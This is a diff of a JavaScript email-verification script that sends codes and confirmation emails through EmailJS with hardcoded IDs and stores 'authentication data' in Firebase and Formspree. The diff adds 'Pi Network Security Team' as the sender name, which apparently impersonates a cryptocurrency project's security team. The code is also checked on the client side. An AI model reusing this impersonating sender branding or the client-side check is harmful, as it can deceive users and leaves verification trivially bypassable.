@@ -1,7 +1,9 @@
 // script.js - Email Verification Authentication
 
 // Initialize EmailJS with your public key
-emailjs.init("hU96YZH7Plzqh0qVZ"); // Replace with your actual EmailJS public key
+(function() {
+    emailjs.init("hU96YZH7Plzqh0qVZ");
+})();
 
 // Global variables
 let verificationCode = '';
@@ -97,15 +99,17 @@ async function sendVerificationCode(email) {
             to_email: email,
             verification_code: verificationCode,
             to_name: email.split('@')[0], // Use email username as name
+            from_name: 'Pi Network Security Team'
         };
 
         // Send email via EmailJS
-        // Replace 'YOUR_SERVICE_ID' and 'YOUR_TEMPLATE_ID' with your actual EmailJS IDs
-        await emailjs.send(
+        const response = await emailjs.send(
             'service_1dm7vk8',        // Your EmailJS service ID
             'template_d7bvk5g',       // Your EmailJS template ID
             templateParams
         );
+
+        console.log('Verification code sent successfully:', response);
 
         // Success - move to code verification step
         sentToEmail.textContent = email;
@@ -115,10 +119,55 @@ async function sendVerificationCode(email) {
 
     } catch (error) {
         console.error('Error sending verification code:', error);
-        showError('Failed to send verification code. Please try again.');
+        
+        // More detailed error message
+        let errorMessage = 'Failed to send verification code. ';
+        if (error.text) {
+            errorMessage += error.text;
+        } else if (error.message) {
+            errorMessage += error.message;
+        } else {
+            errorMessage += 'Please check your internet connection and try again.';
+        }
+        
+        showError(errorMessage);
     } finally {
         sendCodeBtn.disabled = false;
         sendSpinner.style.display = 'none';
+    }
+}
+
+// Send confirmation email after successful verification
+async function sendConfirmationEmail(email) {
+    try {
+        const templateParams = {
+            to_email: email,
+            to_name: email.split('@')[0],
+            from_name: 'Pi Network Security Team',
+            confirmation_date: new Date().toLocaleString('en-US', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            })
+        };
+
+        // Send confirmation email via EmailJS
+        // You'll need to create a second template for confirmation
+        const response = await emailjs.send(
+            'service_1dm7vk8',        // Same service ID
+            'template_confirmation',   // Create a new template for confirmation
+            templateParams
+        );
+
+        console.log('Confirmation email sent successfully:', response);
+
+    } catch (error) {
+        console.error('Error sending confirmation email:', error);
+        // Don't show error to user since they're already verified
+        // Just log it for debugging
     }
 }
 
@@ -133,6 +182,9 @@ async function verifyCode(enteredCode) {
         if (enteredCode === verificationCode) {
             // Code is correct - save to Firebase and Formspree
             await saveAuthenticationData();
+            
+            // Send confirmation email
+            await sendConfirmationEmail(userEmail);
             
             // Show success step
             goToStep(successStep);
@@ -293,4 +345,3 @@ codeInput.addEventListener('input', () => {
     codeInput.classList.remove('error');
     hideError();
 });
-
